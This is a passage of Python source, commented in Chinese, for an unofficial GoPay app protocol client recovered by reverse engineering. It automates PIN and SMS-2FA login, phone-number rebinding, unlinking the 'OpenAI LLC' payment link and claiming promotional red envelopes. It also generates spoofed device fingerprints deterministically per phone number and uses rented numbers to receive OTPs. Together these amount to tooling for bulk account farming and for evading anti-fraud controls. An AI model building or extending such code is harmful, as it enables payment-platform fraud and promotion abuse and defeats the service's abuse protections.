            "otp": otp,
            "code": otp,
            "method": method,
            "client_id": self.client_id,
            "client_secret": self.client_secret,
            "client_device_id": self.device.unique_id,
        }
        return self.post(AUTH, "/goto-auth/device-verification/login", body)

    def token(self, *, verification_token: Optional[str] = None, authorization_code: Optional[str] = None, refresh_token: Optional[str] = None, challenge_token: Optional[str] = None, account_id: str = "", ext_user_token: Optional[str] = None) -> Tuple[int, Any, Dict[str, str]]:
        # Flutter AOT exact toJson at libapp.so+0xbbdbe4:
        #   {grant_type, account_id, token, client_id, client_secret, ext_user_token}
        # `grant_type` is an enum->string map, not "verification_token" /
        # "authorization_code".  For CVS OTP it is "cvs"; for auth-code
        # exchange it is "auth_code"; refresh remains "refresh_token";
        # 登录 2FA 的 2fa_token 用 "challenge"。
        body: Dict[str, Any] = {
            "grant_type": "",
            "account_id": account_id,
            "token": "",
            "client_id": self.client_id,
            "client_secret": self.client_secret,
            "ext_user_token": ext_user_token,
        }
        if verification_token:
            body.update({"grant_type": "cvs", "token": verification_token})
        elif challenge_token:
            body.update({"grant_type": "challenge", "token": challenge_token})
        elif authorization_code:
            body.update({"grant_type": "auth_code", "token": authorization_code})
        elif refresh_token:
            body.update({"grant_type": "refresh_token", "token": refresh_token})
        else:
            raise ValueError("need verification_token / authorization_code / refresh_token")
        return self.post(AUTH, "/goto-auth/token", body)

    def pin_setup_token(self, access_token: str, pin: str, challenge_id: str = "", verification_token: str = "") -> Tuple[int, Any, Dict[str, str]]:
        # Flutter AOT exact body at libapp.so+0xcd0314:
        #   {client_id, pin, challenge_id}
        # The surrounding request builder also sends static/nullable headers:
        #   is-token-required, otp_auth_token, Verification-Token.
        body = {"client_id": self.client_id, "pin": pin, "challenge_id": challenge_id}
        extra = {"is-token-required": "true"}
        if verification_token:
            extra["verification-token"] = verification_token
        return self.post(API, "/api/v2/users/pins/setup/tokens", body, auth=access_token, extra_headers=extra)

    def pin_setup_token_after_otp(self, access_token: str, pin: str, verification_token: str, challenge_id: str = "", client_id: str = "") -> Tuple[int, Any, Dict[str, str]]:
        # Signup PIN setup path from the recovered reference flow:
        #   POST customer.gopayapi.com/api/v2/users/pins/setup/tokens
        #   body {"client_id":"","pin":pin,"challenge_id":""}
        #   headers Verification-Token: Bearer <goto_pin_wa_sms token>,
        #           Is-Token-Required: false
        body = {"client_id": client_id, "pin": pin, "challenge_id": challenge_id}
        extra = {"verification-token": f"Bearer {verification_token}", "is-token-required": "false"}
        return self.post(CUSTOMER, "/api/v2/users/pins/setup/tokens", body, auth=access_token, extra_headers=extra)

    def set_pin(self, access_token: str, pin: str, otp: str = "", otp_auth_token: str = "", notification_mode: str = "otp_sms") -> Tuple[int, Any, Dict[str, str]]:
        # Flutter AOT exact body at libapp.so+0xcd3164:
        #   {pin}
        # Request-side metadata around libapp.so+0x2314144 includes:
        #   otp, otp_auth_token, notification_mode
        body = {"pin": pin}
        extra = {"notification_mode": notification_mode}
        if otp:
            extra["otp"] = otp
        if otp_auth_token:
            extra["otp_auth_token"] = otp_auth_token
        return self.post(API, "/v2/users/pin", body, auth=access_token, extra_headers=extra)

    # ------------------------------------------------------------------
    # 换绑手机号（改绑新号 + 释放旧号）—— 来自 20260602/gopay换绑.txt
    # ------------------------------------------------------------------
    def customers_update_phone(self, access_token: str, new_phone: str, pin: str, email: str = "", signed_up_country: str = "ID") -> Tuple[int, Any, Dict[str, str]]:
        """PATCH api.gojekapi.com/v5/customers —— 发起换绑，返回 otp_token。

        body: {phone, signed_up_country, email}；header 带 ``pin``。
        new_phone 形如 ``+62...`` 或 ``+66...``（新号）。
        """
        body = {
            "phone": new_phone,
            "signed_up_country": signed_up_country,
            "email": email,
        }
        return self._send(
            "PATCH", API, "/v5/customers", body,
            auth=access_token, extra_headers={"pin": pin},
        )

    def customers_verify_update(self, access_token: str, otp: str, otp_token: str) -> Tuple[int, Any, Dict[str, str]]:
        """POST api.gojekapi.com/v5/customers/verificationUpdateProfile —— 提交换绑 OTP。"""
        body = {"otp": otp, "otp_token": otp_token}
        return self.post(API, "/v5/customers/verificationUpdateProfile", body, auth=access_token)

    # ------------------------------------------------------------------
    # 已关联第三方应用（Linked apps）的查询与解绑 —— 来自 20260603/unlink 抓包
    # ------------------------------------------------------------------
    def linked_apps(self, access_token: str) -> Tuple[int, Any, Dict[str, str]]:
        """GET customer.gopayapi.com/v1/linkedapps —— 列出已关联的第三方服务。

        响应形如::

            {"data": {"linked_services": [
                {"service_id": "CHECKOUT_MIDTRANS",
                 "service_name": "OpenAI LLC",
                 "unlink_service_url": "/v1/links/<link_id>",
                 "allow_service_unlink": true,
                 "linked_accounts": [
                     {"link_id": "<link_id>", "is_active": true,
                      "unlink_url": "/v1/links?link_id=<link_id>",
                      "allow_account_unlink": true}]}]},
             "success": true}
        """
        return self.get(CUSTOMER, "/v1/linkedapps", auth=access_token)

    def unlink_link(self, access_token: str, link_id_or_url: str) -> Tuple[int, Any, Dict[str, str]]:
        """PATCH customer.gopayapi.com/v1/links/<link_id> —— 解绑一个关联。

        抓包里 App 走的是 ``unlink_service_url``（``/v1/links/<link_id>``）的
        **PATCH**、空 body（content-length: 0），返回 ``202 {"success": true}``。
        入参可以直接传 link_id，也可以传完整的 ``/v1/links/<link_id>`` 路径。
        """
        value = str(link_id_or_url or "").strip()
        if not value:
            raise ValueError("empty link id/url")
        if value.startswith("http://") or value.startswith("https://"):
            value = urlparse(value).path
        if value.startswith("/v1/links"):
            path = value
        else:
            path = f"/v1/links/{value}"
        # 空 body：body=None -> body_text="" -> content-length 0，与抓包一致。
        return self._send("PATCH", CUSTOMER, path, None, auth=access_token)

    # ------------------------------------------------------------------
    # known-PIN 登录（goto_pin / login_1fa）—— 来自 20260602/gopay_rebind_smscode
    # ------------------------------------------------------------------
    def pin_tokens_nb(self, challenge_id: str, pin: str, client_id: str = MFAGOJEK_CLIENT_ID) -> Tuple[int, Any, Dict[str, str]]:
        """POST customer.gopayapi.com/api/v1/users/pin/tokens/nb —— 用 PIN 换 validation_jwt。

        login_1fa 的 goto_pin 验证：把明文 PIN + challenge_id 提交给
        CUSTOMER，拿回 ``data.token``（RS256 validation_jwt），再交给
        cvs/v1/verify 完成挑战。``client_id`` 用 MFAGOJEK（登录态），与付款
        链路的 MGUPA/GWC 区分。
        """
        body = {"challenge_id": challenge_id, "client_id": client_id, "pin": pin}
        return self.post(CUSTOMER, "/api/v1/users/pin/tokens/nb", body)

    def cvs_verify_pin_validation(self, verification_id: str, challenge_id: str, validation_jwt: str,
                                  flow: str = "login_1fa", method: str = "goto_pin") -> Tuple[int, Any, Dict[str, str]]:
        """POST accounts.goto-products.com/cvs/v1/verify —— 用 validation_jwt 完成 goto_pin 挑战。

        与 OTP 版 ``cvs_verify`` 不同：data 里放的是
        ``{challenge_id, validation_jwt}`` 而不是 ``{otp, otp_token}``。
        """
        body = {
            "client_id": self.client_id,
            "client_secret": self.client_secret,
            "data": {"challenge_id": challenge_id, "validation_jwt": validation_jwt},
            "flow": flow,
            "verification_id": verification_id,
            "verification_method": method,
        }
        return self.post(AUTH, "/cvs/v1/verify", body)

    def cvs_initiate_login(self, phone_local: str, verification_id: str, method: str = "goto_pin",
                           flow: str = "login_1fa", country_code: str = "+62",
                           is_multiple_method: Optional[bool] = True) -> Tuple[int, Any, Dict[str, str]]:
        """POST cvs/v1/initiate —— 登录专用（真机抓包对齐）。

        与注册用的 ``cvs_initiate`` 区别：登录 1fa(goto_pin) 真机带
        ``is_multiple_method: true``；2fa(otp_sms) 带 null。响应里返回的是
        **challenge_id**（不是新的 verification_id），交给 pin/tokens/nb。
        """
        body = {
            "verification_id": verification_id,
            "flow": flow,
            "verification_method": method,
            "country_code": country_code,
            "email_address": None,
            "client_id": self.client_id,
            "phone_number": phone_local,
            "client_secret": self.client_secret,
            "is_multiple_method": is_multiple_method,
            "device_verification_token_id": None,
        }
        return self.post(AUTH, "/cvs/v1//initiate", body, extra_headers={"key": "value"}, sign_path="/cvs/v1/initiate")

    def pin_page_nb(self, access_token: Optional[str], challenge_id: str) -> Tuple[int, Any, Dict[str, str]]:
        """GET customer.gopayapi.com/api/v2/challenges/{challenge_id}/pin-page/nb。

        真机登录在 pin/tokens/nb 之前会先 GET 这个 pin-page（预热/取
        challenge 元数据）。登录态此时还没有 access_token，可传 None。
        """
        return self.get(CUSTOMER, f"/api/v2/challenges/{challenge_id}/pin-page/nb", auth=access_token)

    def token_2fa(self, challenge_token: str, verification_token: str, account_id: str = "") -> Tuple[int, Any, Dict[str, str]]:
        """POST goto-auth/token —— 登录 2FA 最终兑换（真机抓包对齐）。

        body: ``{grant_type:"challenge", token:<2fa_token>, account_id?, ...}``
        header: ``verification-token: Bearer <login_2fa cvs/verify 拿到的 token>``
        返回最终 access_token / refresh_token。
        """
        body: Dict[str, Any] = {
            "grant_type": "challenge",
            "account_id": account_id,
            "token": challenge_token,
            "client_id": self.client_id,
            "client_secret": self.client_secret,
            "ext_user_token": None,
        }
        extra = {"verification-token": f"Bearer {verification_token}"}
        return self.post(AUTH, "/goto-auth/token", body, extra_headers=extra)


# ===========================================================================
# 主项目集成层（aBaiAutoplus）
#
# 下面这一段不是参考脚本的原始内容，是为了把"GoPay App 纯协议"
# （gopay:consumer:app, com.gojek.gopay 2.10.0）接进主项目而加的：
#   1. build_device_profile(seed)  —— 复用现有 generate_device_identity(seed)，
#      保持"同号永远同指纹 + 12 机型随机"的确定性设备身份；
#   2. GoPayAppClient               —— 包装 GoPayProtocol，实现下游
#      （_check_balance / _resume_account / EnvelopeManager）依赖的 client 契约：
#        .user_uuid / .auth.access_token / .auth.refresh_token
#        get_balance() / refresh_token() / _gopay_get() / envelope_claim()
#   3. 一组从参考 runner 移植过来的纯函数（has_error_code 等）。
# ===========================================================================


def has_error_code(data: Any, code: str) -> bool:
    """递归判断响应里是否带某个业务错误码（如 ``auth:error:user:not_found``）。"""
    if isinstance(data, dict):
        errs = data.get("errors")
        if isinstance(errs, list):
            if any(isinstance(e, dict) and e.get("code") == code for e in errs):
                return True
        return any(has_error_code(v, code) for v in data.values())
    if isinstance(data, list):
        return any(has_error_code(v, code) for v in data)
    return False


def is_success_response(status: int, data: Any, allow: Tuple[int, ...] = (200, 201, 202)) -> bool:
    if status not in allow:
        return False
    if isinstance(data, dict) and data.get("success") is False:
        return False
    return True


def is_waf_html(status: int, data: Any) -> bool:
    raw = data.get("raw", "") if isinstance(data, dict) else ""
    return status == 403 and isinstance(raw, str) and (
        "WAF Block Page" in raw or "Tencent Cloud WAF" in raw
    )


def is_phone_registered_error(data: Any) -> bool:
    text = json.dumps(data, ensure_ascii=False, default=str) if not isinstance(data, str) else data
    return "CO:CUST:phone_already_taken" in text or "Nomor HP-mu sudah terdaftar" in text


def extract_account_id(data: Any) -> Optional[str]:
    """从 accountlist / signup 响应里挑数字型 GoTo/GoPay account_id。"""
    candidates = []

    def walk(x: Any, path: str = "") -> None:
        if isinstance(x, dict):
            for k, v in x.items():
                lk = k.lower()
                if lk in {"account_id", "accountid", "customer_id", "userid", "user_id", "id"}:
                    if isinstance(v, (str, int)) and re.fullmatch(r"\d{5,20}", str(v)):
                        candidates.append((0 if "account" in lk else 1, path + "/" + k, str(v)))
                walk(v, path + "/" + k)
        elif isinstance(x, list):
            for i, v in enumerate(x):
                walk(v, f"{path}[{i}]")

    walk(data)
    if not candidates:
        return None
    candidates.sort(key=lambda t: (t[0], len(t[1])))
    return candidates[0][2]


def _deterministic_d1(seed: str) -> str:
    """从手机号确定性派生一个 32 字节 ``XX:XX:...`` 形态的 D1。

    GoPay App 的 D1 是 APK 证书指纹，参考脚本里其实是每设备随机
    （``new_d1()``）。为了满足"同号永远同指纹"，这里改成按 seed 派生，
    保证同号每次跑出来一致，又对每个号不同。
    """
    digest = hashlib.sha256(("gopay-d1:" + str(seed)).encode("utf-8")).digest()
    raw = (digest * 2)[:32]  # 32 bytes
    return ":".join(f"{b:02X}" for b in raw)


def build_device_profile(seed: str) -> "DeviceProfile":
    """用现有 ``generate_device_identity(seed)`` 构造 GoPay App 的 DeviceProfile。

    保留主项目原有的设备身份策略：手机号当种子，确定性派生（同号同指纹），
    12 种机型随机。把它映射到 GoPay App（com.gojek.gopay 2.10.0）需要的字段：
      - unique_id / x_session_id / x_m1 直接复用确定性身份；
      - phone_make / phone_model / device_os 按 GoPay App 的展示格式重排；
      - app_id / app_version / app_build / x_e2 用 GoPay App 常量（不是 Gojek 主 App）。
    """
    from .gojek_client import generate_device_identity

    ident = generate_device_identity(str(seed))
    model_raw = str(ident.get("model") or "Xiaomi,23117RK66C")
    if "," in model_raw:
        make_part, model_part = model_raw.split(",", 1)
    else:
        make_part, model_part = (ident.get("phone_make") or "Xiaomi"), model_raw
    make = str(ident.get("phone_make") or make_part).strip() or "Xiaomi"
    phone_model = f"{make}, {model_part.strip()}"
    os_info = str(ident.get("os_info") or "Android,15").replace(",", ", ")

    return DeviceProfile(
        unique_id=str(ident.get("uniqueid") or new_device_id()),
        x_m1=str(ident.get("xm1") or ""),
        d1=_deterministic_d1(seed),
        x_e2=X_E2_DEFAULT,
        x_session_id=str(ident.get("session_id") or ""),
        adjts="host:D",
        phone_make=make,
        phone_model=phone_model,
        device_os=os_info,
        # 关键：GoPay App 协议必须用 GoPay App 的 app 标识，不能用 Gojek 主 App。
        app_id=APP_ID,
        app_version=APP_VERSION,
        app_build=APP_BUILD,
    )


class _AuthState:
    """与旧 GojekClient.auth 兼容的可变 token 容器。"""

    def __init__(self, access_token: str = "", refresh_token: str = ""):
        self.access_token = access_token
        self.refresh_token = refresh_token


def login_with_known_pin(gp: "GoPayProtocol", phone: str, pin: str, log=None,
                          wait_2fa_otp=None) -> Tuple[str, str]:
    """用**已知 PIN**登录一个已注册账号（真机抓包对齐，两段式 1fa+2fa）。

    真机 GoPay 2.8.0 登录实测流程（gopay-auto-protocol/20260603/login）：

      1. login/methods                         → verification_id(1fa) + methods
      2. cvs/v1/initiate(login_1fa, goto_pin,   → challenge_id
         is_multiple_method=true)
      3. (可选) GET challenges/{cid}/pin-page/nb 预热
      4. pin/tokens/nb {challenge_id, MFAGOJEK, pin} → validation_jwt
      5. cvs/v1/verify(login_1fa, goto_pin,     → verification_token(1fa)
         data={challenge_id, validation_jwt})
      6. accountlist(verification-token=1fa)    → account_id + 1fa_token
      7. token(grant=cvs, account_id, 1fa_token) → **403 need_2fa** + 2fa_token
                                                   + 新 verification_id(2fa)
      8. cvs/v1/initiate(login_2fa, otp_sms)    → otp_token，发短信到该号
      9. wait_2fa_otp(phone) 接短信 OTP
     10. cvs/v1/verify(login_2fa, otp, otp_token) → verification_token(2fa)
     11. token_2fa(grant=challenge, 2fa_token,  → **access_token / refresh_token**
         header verification-token=2fa verify token)

    关键差异（修复之前 known-PIN 登录必 401 的根因）：
      - verification_id 来自 **login/methods**，不是 cvs/v1/methods（登录不调 methods）
      - 1fa 之后服务端**强制 2FA OTP**，必须再接一条短信才能拿 access_token

    ``wait_2fa_otp(phone, timeout) -> code|None``：登录 2FA 的短信回调。
    **该号必须能接这条 2FA 短信**（成熟号换绑场景=正在租的新号）。不传则
    走完 1fa 在 403 处返回 ``("", "")``（拿不到最终 token）。

    返回 ``(access_token, refresh_token)``；失败 ``("", "")``。
    """
    _log = log or (lambda *_a, **_k: None)
    country_code, local = normalize_id_phone(phone)

    # === 1. login/methods → verification_id(1fa) ===
    gp.new_cvs_session()
    sc, data, _ = gp.login_methods(local, country_code)
    if sc not in (200, 201, 202):
        _log(f"[known-pin] login_methods HTTP {sc}")
        return "", ""
    methods = pick_first(data, ["allowed_methods", "methods"]) or []
    verification_id = str(pick_first(data, ["verification_id"]) or "")
    if isinstance(methods, list) and methods and "goto_pin" not in methods:
        _log(f"[known-pin] 该号不支持 goto_pin 登录（methods={methods}）")
        # 仍尝试，服务端会拒
    # login/methods 不一定回 verification_id；没有就回退 cvs/v1/methods 拿
    if not verification_id:
        sc, data, _ = gp.cvs_methods(local, flow="login_1fa", country_code=country_code)
        if sc in (200, 201, 202):
            verification_id = str(pick_first(data, ["verification_id"]) or "")
    if not verification_id:
        _log("[known-pin] no verification_id from login/methods")
        return "", ""

    # === 2. cvs/v1/initiate(login_1fa, goto_pin, is_multiple_method=true) → challenge_id ===
    sc, data, _ = gp.cvs_initiate_login(
        local, verification_id, method="goto_pin", flow="login_1fa",
        country_code=country_code, is_multiple_method=True,
    )
    if sc not in (200, 201, 202, 204):
        _log(f"[known-pin] cvs_initiate(login_1fa/goto_pin) HTTP {sc}: {str(data)[:300]}")
        return "", ""
    challenge_id = str(pick_first(data, ["challenge_id", "challengeId"]) or "")
    if not challenge_id:
        _log(f"[known-pin] cvs_initiate 未返回 challenge_id: {str(data)[:200]}")
        return "", ""

    # === 3. (可选) pin-page 预热 ===
    try:
        gp.pin_page_nb(None, challenge_id)
    except Exception:
        pass

    # === 4. pin/tokens/nb → validation_jwt ===
    sc, data, _ = gp.pin_tokens_nb(challenge_id, pin, client_id=MFAGOJEK_CLIENT_ID)
    if sc not in (200, 201, 202):
        _log(f"[known-pin] pin/tokens/nb HTTP {sc}: {str(data)[:300]}")
        return "", ""
    validation_jwt = str(pick_first(data, ["token"]) or "")
    if not validation_jwt:
        _log("[known-pin] no validation_jwt")
        return "", ""

    # === 5. cvs/v1/verify(login_1fa, goto_pin, validation_jwt) → verification_token(1fa) ===
    sc, data, _ = gp.cvs_verify_pin_validation(
        verification_id, challenge_id, validation_jwt, flow="login_1fa", method="goto_pin",
    )
    if sc not in (200, 201, 202):
        _log(f"[known-pin] cvs/v1/verify(login_1fa) HTTP {sc}: {str(data)[:300]}")
        return "", ""
    vtoken_1fa = str(pick_first(data, ["verification_token", "verificationToken"]) or "")
    if not vtoken_1fa:
        _log("[known-pin] login_1fa 无 verification_token")
        return "", ""

    # === 6. accountlist → account_id + 1fa_token ===
    sc, data, _ = gp.accountlist(vtoken_1fa)
    if sc not in (200, 201, 202):
        _log(f"[known-pin] accountlist HTTP {sc}")
        return "", ""
    account_id = extract_account_id(data) or ""
    one_fa_token = str(pick_first(data, ["1fa_token", "one_fa_token", "token"]) or vtoken_1fa)

    # === 7. token(grant=cvs, account_id, 1fa_token) → 期望 403 need_2fa + 2fa_token ===
    sc, data, _ = gp.token(verification_token=one_fa_token, account_id=account_id)
    access_token = str(pick_first(data, ["access_token", "accessToken"]) or "")
    refresh_token = str(pick_first(data, ["refresh_token", "refreshToken"]) or "")
    if access_token:
        # 个别号/受信设备 1fa 直接给 token（无 2fa）
        gp.clear_cvs_session()
        _log("[known-pin] 1fa 直接拿到 access_token（无需 2fa）")
        return access_token, refresh_token

    twofa_token = str(pick_first(data, ["2fa_token", "two_fa_token"]) or "")
    vid_2fa = str(pick_first(data, ["verification_id"]) or "")
    if not twofa_token or not vid_2fa:
        _log(f"[known-pin] 1fa 后既无 access_token 也无 2fa_token，放弃: HTTP {sc} {str(data)[:300]}")
        return "", ""

    if not callable(wait_2fa_otp):
        _log("[known-pin] 需要 2FA OTP 但没有提供 wait_2fa_otp 回调，放弃")
        return "", ""

    # === 8. cvs/v1/initiate(login_2fa, otp_sms) → otp_token，发短信 ===
    # 关键：2fa 必须延续 1fa 的同一个 transaction-id（真机抓包确认整条登录
    # login/methods→1fa→token→2fa→token 全程同一 txn）。**不要** new_cvs_session，
    # 否则服务端判 invalid_parameter（换了会话 id）。
    sc, data, _ = gp.cvs_initiate_login(
        local, vid_2fa, method="otp_sms", flow="login_2fa",
        country_code=country_code, is_multiple_method=None,
    )
    if sc not in (200, 201, 202, 204):
        _log(f"[known-pin] cvs_initiate(login_2fa) HTTP {sc}: {str(data)[:300]}")
        return "", ""
    otp_token = str(pick_first(data, ["otp_token", "otpToken"]) or "")

    # === 9. 接 2FA 短信 OTP ===
    try:
        otp = wait_2fa_otp(phone, 180)
    except Exception as exc:
        _log(f"[known-pin] wait_2fa_otp 异常: {exc}")
        return "", ""
    if not otp:
        _log("[known-pin] 2FA OTP 超时/未拿到")
        return "", ""

    # === 10. cvs/v1/verify(login_2fa, otp) → verification_token(2fa) ===
    sc, data, _ = gp.cvs_verify(
        local, vid_2fa, str(otp), method="otp_sms", flow="login_2fa",
        country_code=country_code, otp_token=otp_token or None,
    )
    if sc not in (200, 201, 202):
        _log(f"[known-pin] cvs/v1/verify(login_2fa) HTTP {sc}: {str(data)[:300]}")
        return "", ""
    vtoken_2fa = str(pick_first(data, ["verification_token", "verificationToken"]) or "")
    if not vtoken_2fa:
        _log("[known-pin] login_2fa 无 verification_token")
        return "", ""

    # === 11. token_2fa(grant=challenge, 2fa_token, header verification-token=2fa) ===
    # 仍用同一 txn（真机最终 token 也在同会话内）。
    sc, data, _ = gp.token_2fa(twofa_token, vtoken_2fa, account_id=account_id)
    gp.clear_cvs_session()
    if sc not in (200, 201, 202):
        _log(f"[known-pin] token_2fa HTTP {sc}: {str(data)[:300]}")
        return "", ""
    return (
        str(pick_first(data, ["access_token", "accessToken"]) or ""),
        str(pick_first(data, ["refresh_token", "refreshToken"]) or ""),
    )


class _AuthState:
    """与旧 GojekClient.auth 兼容的可变 token 容器。"""

    def __init__(self, access_token: str = "", refresh_token: str = ""):
        self.access_token = access_token
        self.refresh_token = refresh_token


class GoPayAppClient:
    """GoPay App 纯协议客户端的下游兼容包装。

    取代旧的 ``GojekClient``（gojek:consumer:app）。注册/resume 完成后，
    下游只用到这几样：余额查询、token 刷新、红包领取、以及 ``.user_uuid`` /
    ``.auth.access_token`` / ``.auth.refresh_token`` 三个属性。这里全部用
    ``GoPayProtocol``（gopay:consumer:app）实现，签名走 GoPay App 的 X-E1。
    """

    def __init__(
        self,
        proto: "GoPayProtocol",
        *,
        phone: str = "",
        local: str = "",
        user_uuid: str = "",
        access_token: str = "",
        refresh_token: str = "",
    ):
        self.proto = proto
        self.phone = phone
        self.local = local
        self.user_uuid = user_uuid
        self.auth = _AuthState(access_token=access_token, refresh_token=refresh_token)

    # --- 下游契约：余额 ---------------------------------------------------
    def get_balance(self) -> Dict[str, Any]:
        """GET customer.gopayapi.com/v1/payment-options/balances。

        返回 ``{"status","body"}``，body 形如
        ``{"data":[{"balance":{"value":<int IDR>}}]}``，与 ``_check_balance``
        的解析对齐。
        """
        sc, data, _ = self.proto.get(
            CUSTOMER, "/v1/payment-options/balances", auth=self.auth.access_token
        )
        return {"status": sc, "body": data}

    # --- 下游契约：刷新 token --------------------------------------------
    def refresh_token(self) -> Dict[str, Any]:
        sc, data, _ = self.proto.token(refresh_token=self.auth.refresh_token, account_id="")
        if is_success_response(sc, data):
            at = pick_first(data, ["access_token", "accessToken"])
            rt = pick_first(data, ["refresh_token", "refreshToken"])
            if at:
                self.auth.access_token = str(at)
            if rt:
                self.auth.refresh_token = str(rt)
        return {"status": sc, "body": data}

    # --- 下游契约：EnvelopeManager 用的底层 GET / 红包领取 ----------------
    def _gopay_get(self, path: str) -> Dict[str, Any]:
        sc, data, _ = self.proto.get(CUSTOMER, path, auth=self.auth.access_token)
        return {"status": sc, "body": data}

    def _gopay_post(self, path: str, body: Dict[str, Any], extra: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
        sc, data, _ = self.proto.post(CUSTOMER, path, body, auth=self.auth.access_token, extra_headers=extra)
        return {"status": sc, "body": data}

    def envelope_claim(self, deeplink_id: str) -> Dict[str, Any]:
        """红包两步式领取，兼容 ``EnvelopeManager.claim_one``。"""
        r1 = self._gopay_get(f"/v1/festivals/envelope-requests/{deeplink_id}")
        if r1["status"] != 200:
            return r1
        body = r1.get("body") or {}
        eid = ""
        if isinstance(body, dict):
            data = body.get("data") or {}
            if isinstance(data, dict):
                eid = str(data.get("envelope_request_id") or "")
        if not eid:
            return r1
        time.sleep(1)
        return self._gopay_post("/v1/festivals/envelope-requests", {"envelope_request_id": eid})

    def close(self) -> None:
        try:
            self.proto.close()
        except Exception:
            pass

    # --- 换绑手机号（改绑新号 + 释放旧号）---------------------------------
    def rebind_phone(self, *, new_phone: str, pin: str, wait_otp, email: str = "",
                     signed_up_country: str = "ID", otp_timeout: int = 180,
                     unlink_openai_first: bool = True,
                     unlink_keyword: str = "OpenAI", log=None) -> dict:
        """把当前登录账号从旧号换绑到 ``new_phone`` 并释放旧号。

        步骤（对应用户给的换绑链路 4→5→6）：
          0. （unlink_openai_first）进入 Linked apps，解绑 OpenAI LLC
          1. PATCH /v5/customers (pin header) -> otp_token
          2. wait_otp(new_phone, timeout) 从新号接 OTP
          3. POST /v5/customers/verificationUpdateProfile -> 完成

        Args:
            new_phone: 新手机号（+62 / +66 等，带国码）
            pin: 当前账号 6 位 PIN
            wait_otp: 拿新号 OTP 的回调 (phone, timeout) -> code|None
            email: 换绑同时可改邮箱（可空）
            unlink_openai_first: 换绑前先解绑 OpenAI LLC（默认开）
            unlink_keyword: 要解绑的已关联应用名关键字（默认 OpenAI）

        Returns: {"success": bool, "detail": str, "new_phone": str}
        """
        _log = log or (lambda *_a, **_k: None)
        at = self.auth.access_token

        # 步骤 4+5：进入 Linked apps -> 解绑 OpenAI LLC（换绑前先解绑，避免新号
        # 继承旧号对商户的关联）。解绑失败只告警不阻断换绑。
        if unlink_openai_first:
            try:
                ures = self.unlink_linked_app(service_name_keyword=unlink_keyword, log=log)
                if ures.get("success"):
                    if ures.get("unlinked"):
                        _log(f"[rebind] 换绑前已解绑：{ures['unlinked']}")
                else:
                    _log(f"[rebind] 换绑前解绑未成功（继续换绑）：{ures.get('detail')}")
            except Exception as exc:
                _log(f"[rebind] 换绑前解绑异常（继续换绑）：{exc}")

        sc, data, _ = self.proto.customers_update_phone(
            at, new_phone, pin, email=email, signed_up_country=signed_up_country,
        )
        if not is_success_response(sc, data):
            return {"success": False, "detail": f"update_phone 失败 HTTP {sc}: {data}", "new_phone": new_phone}
        otp_token = pick_first(data, ["otp_token", "otpToken"])
        if not otp_token:
            return {"success": False, "detail": f"update_phone 未返回 otp_token: {data}", "new_phone": new_phone}
        _log(f"[rebind] 已提交换绑到 {new_phone}，等待新号 OTP…")

        code = None
        try:
            code = wait_otp(new_phone, otp_timeout)
        except Exception as exc:
            return {"success": False, "detail": f"等换绑 OTP 异常: {exc}", "new_phone": new_phone}
        if not code:
            return {"success": False, "detail": "换绑 OTP 超时/未拿到", "new_phone": new_phone}

        sc, data, _ = self.proto.customers_verify_update(at, str(code), str(otp_token))
        if not is_success_response(sc, data):
            return {"success": False, "detail": f"verify_update 失败 HTTP {sc}: {data}", "new_phone": new_phone}
        _log(f"[rebind] 换绑成功，旧号已释放，新号 {new_phone}")
        return {"success": True, "detail": "rebind ok", "new_phone": new_phone}

    # --- 解绑已关联第三方应用（Linked apps，如 OpenAI LLC）-----------------
    def list_linked_apps(self, log=None) -> list:
        """读取当前账号的 Linked apps 列表，返回 ``linked_services`` 数组。

        失败/为空时返回 ``[]``。
        """
        _log = log or (lambda *_a, **_k: None)
        sc, data, _ = self.proto.linked_apps(self.auth.access_token)
        if not is_success_response(sc, data):
            _log(f"[unlink] 读取 Linked apps 失败 HTTP {sc}: {data}")
            return []
        services = []
        if isinstance(data, dict):
            inner = data.get("data")
            if isinstance(inner, dict):
                raw = inner.get("linked_services")
                if isinstance(raw, list):
                    services = raw
        return services

    def unlink_linked_app(self, *, service_name_keyword: str = "OpenAI", log=None) -> dict:
        """解绑名称匹配 ``service_name_keyword`` 的已关联应用（默认 OpenAI LLC）。

        对应 GoPay App「Linked apps → 解绑 OpenAI LLC」：
          1. GET /v1/linkedapps 找到目标 service 的 unlink_service_url / link_id
          2. PATCH /v1/links/<link_id> 空 body 解绑 -> 202 {"success": true}

        返回 ``{"success": bool, "detail": str, "unlinked": [服务名...]}``。
        没找到目标服务时 success=True、unlinked=[]（视为无需解绑）。
        """
        _log = log or (lambda *_a, **_k: None)
        keyword = str(service_name_keyword or "").strip().lower()
        services = self.list_linked_apps(log=log)
        if not services:
            _log("[unlink] Linked apps 为空，无需解绑")
            return {"success": True, "detail": "no linked services", "unlinked": []}

        targets = []
        for svc in services:
            if not isinstance(svc, dict):
                continue
            name = str(svc.get("service_name") or "")
            if keyword and keyword not in name.lower():
                continue
            # 优先用 service 顶层的 unlink_service_url（抓包里 App 走的就是它），
            # 回退到 linked_accounts[].link_id。
            url = str(svc.get("unlink_service_url") or "").strip()
            link_id = ""
            for acc in (svc.get("linked_accounts") or []):
                if isinstance(acc, dict) and acc.get("link_id"):
                    link_id = str(acc.get("link_id"))
                    break
            targets.append((name, url, link_id))

        if not targets:
            _log(f"[unlink] 未找到匹配 '{service_name_keyword}' 的已关联应用，跳过")
            return {"success": True, "detail": "target not linked", "unlinked": []}

        unlinked = []
        for name, url, link_id in targets:
            ref = url or link_id
            if not ref:
                _log(f"[unlink] {name} 缺少 unlink_service_url/link_id，跳过")
                continue
            sc, data, _ = self.proto.unlink_link(self.auth.access_token, ref)
            if is_success_response(sc, data):
                _log(f"[unlink] 已解绑 {name}（{ref}）-> HTTP {sc}")
                unlinked.append(name)
            else:
                _log(f"[unlink] 解绑 {name} 失败 HTTP {sc}: {data}")
                return {"success": False, "detail": f"unlink {name} 失败 HTTP {sc}: {data}", "unlinked": unlinked}

        return {"success": True, "detail": "unlink ok", "unlinked": unlinked}
